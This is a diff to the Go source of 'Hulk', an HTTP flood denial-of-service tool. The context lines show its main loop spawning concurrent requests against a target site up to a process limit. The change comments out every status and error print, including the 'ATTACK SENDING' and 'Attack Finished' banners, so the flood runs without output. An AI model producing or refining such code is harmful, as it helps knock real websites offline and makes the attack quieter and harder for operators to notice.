@@ -93,12 +93,12 @@ func main() {
 
 	u, err := url.Parse(site)
 	if err != nil {
-		fmt.Println("err parsing url parameter\n")
+		//fmt.Println("err parsing url parameter\n")
 		os.Exit(1)
 	}
 
 	if version {
-		fmt.Println("Hulk", __version__)
+		//fmt.Println("Hulk", __version__)
 		os.Exit(0)
 	}
 
@@ -112,24 +112,24 @@ func main() {
 				headersUseragents = append(headersUseragents, a)
 			}
 		} else {
-			fmt.Printf("can'l load User-Agent list from %s\n", agents)
+			//fmt.Printf("can'l load User-Agent list from %s\n", agents)
 			os.Exit(1)
 		}
 	}
 
 	go func() {
-		fmt.Println("-- ATTACK SENDING --\n           !\n\n")
+		//fmt.Println("-- ATTACK SENDING --\n           !\n\n")
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
 		)
-		fmt.Println("USING               |\tResp OK |\tGot err")
+		//fmt.Println("USING               |\tResp OK |\tGot err")
 		for {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
 			}
 			if sent%10 == 0 {
-				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+				//fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
 			}
 			switch <-ss {
 			case callExitOnErr:
@@ -142,8 +142,8 @@ func main() {
 				sent++
 			case targetComplete:
 				sent++
-				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
-				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
+				//fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+				//fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
 				os.Exit(0)
 			}
 		}
@@ -152,7 +152,7 @@ func main() {
 	ctlc := make(chan os.Signal)
 	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
 	<-ctlc
-	fmt.Println("\r\n-- Interrupted by user --        \n")
+	//fmt.Println("\r\n-- Interrupted by user --        \n")
 }
 
 func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
